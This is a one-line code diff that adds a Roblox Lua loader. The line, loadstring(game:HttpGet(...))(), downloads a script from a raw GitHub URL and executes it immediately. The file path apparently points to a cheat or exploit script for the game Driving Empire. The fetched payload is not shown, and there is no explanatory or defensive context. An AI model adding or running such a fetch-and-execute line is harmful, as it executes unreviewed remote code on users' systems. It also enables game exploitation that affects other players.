@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/driving-empire-rp-servers-spam6-crtap8pujmij18.lua"))()
